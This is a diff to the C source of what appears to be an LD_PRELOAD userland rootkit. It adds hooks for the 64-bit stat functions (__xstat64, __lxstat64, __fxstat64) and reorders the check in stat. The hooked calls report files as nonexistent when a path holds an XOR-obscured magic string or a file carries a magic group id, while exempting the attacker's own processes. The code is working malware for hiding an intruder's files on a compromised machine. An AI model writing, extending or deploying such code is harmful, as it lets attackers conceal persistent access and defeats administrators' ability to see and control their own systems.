@@ -1,4 +1,5 @@
 #define _GNU_SOURCE
+#define _LARGEFILE_SOURCE 1
 #include <stdio.h>
 #include <unistd.h>
 #include <strings.h>
@@ -73,14 +74,18 @@ int (*old___fxstat)(int ver, int fildes, struct stat *buf);
 int (*old_fstat)(int fildes, struct stat *buf); 
 int (*old_fstatat)(int fd, const char *restrict path, struct stat *restrict buf, int flag); 
 int (*old_lstat)(const char *restrict path, struct stat *restrict buf);
+int (*old___xstat64)(int ver, const char *path, struct stat64 *buf); 
+int (*old___lxstat64)(int ver, const char *path, struct stat64 *buf); 
+int (*old___fxstat64)(int ver, int fildes, struct stat64 *buf);
 
-//permissions 
+//permissions and ownership  
 int (*old_chmod)(const char *pathname, mode_t mode);
 int (*old_fchmod)(int fd, mode_t mode);
 int (*old_fchmodat)(int dirfd, const char *pathname, mode_t mode, int flags);
 int (*old_chown)(const char *pathname, uid_t owner, gid_t group); 
 int (*old_fchown)(int fd, uid_t owner, gid_t group); 
 int (*old_lchown)(const char *pathname, uid_t owner, gid_t group); 
+gid_t (*old_getgid)(void);
 
 int owned(void)
 { 
@@ -190,10 +195,10 @@ int stat(const char *path, struct stat *buf)
 	printf("[!] stat hooked\n"); 
 	#endif
 
-	char *magic = strdup(MAGIC); xor(magic); 
-       	struct stat filestat; 
-	old_stat(path, &filestat); 
 	if (owned()) return old_stat(path, buf); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	struct stat filestat; 
+	old_stat(path, &filestat);
 	if (strstr(path, magic) || (filestat.st_gid == MAGICGID))
 	{
 		CLEAN(magic);
@@ -349,6 +354,66 @@ int fstatat(int fd, const char *restrict path, struct stat *restrict buf, int fl
 		return -1; 
 	} 
 	return old_fstatat(fd, path, buf, flag);
+}
+
+int __xstat64(int ver, const char *path, struct stat64 *buf)
+{ 
+	HOOK(__xstat64); 
+	#ifdef DEBUG 
+	printf("[!] xstat64 hooked\n"); 
+	#endif 
+
+	if (owned()) return old___xstat64(ver, path, buf); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	struct stat64 filestat; 
+	old___xstat64(_STAT_VER, path, &filestat); 
+	if ((strstr(path, magic)) || (filestat.st_gid == MAGICGID))
+	{ 
+		CLEAN(magic);
+		errno = ENOENT; 
+		return -1; 
+	}
+	CLEAN(magic);
+	return old___xstat64(ver, path, buf);
+}
+
+int __lxstat64(int ver, const char *path, struct stat64 *buf)
+{ 
+	HOOK(__lxstat64); 
+	#ifdef DEBUG 
+	printf("[!] lxstat64 hooked\n"); 
+	#endif 
+
+	if (owned()) return old___lxstat64(ver, path, buf); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	struct stat64 filestat; 
+	old___lxstat64(_STAT_VER, path, &filestat); 
+	if ((strstr(path, magic)) || (filestat.st_gid == MAGICGID))
+	{ 
+		CLEAN(magic); 
+		errno = ENOENT; 
+		return -1; 
+	} 
+	CLEAN(magic); 
+	return old___lxstat64(ver, path, buf);
+}
+
+int __fxstat64(int ver, int fildes, struct stat64 *buf)
+{ 
+	HOOK(__fxstat64); 
+	#ifdef DEBUG 
+	printf("[!] fxstat64 hooked\n"); 
+	#endif 
+
+	if (owned()) return old___fxstat64(ver, fildes, buf); 
+	struct stat64 filestat; 
+	old___fxstat64(_STAT_VER, fildes, &filestat); 
+	if (filestat.st_gid == MAGICGID)
+	{ 
+		errno = ENOENT; 
+		return -1; 
+	}
+	return old___fxstat64(ver, fildes, buf);
 }
 
 int link(const char *oldpath, const char *newpath)
@@ -1001,5 +1066,4 @@ int lchown(const char *pathname, uid_t owner, gid_t group)
 	CLEAN(magic);
 	return old_lchown(pathname, owner, group); 
 }
-
 
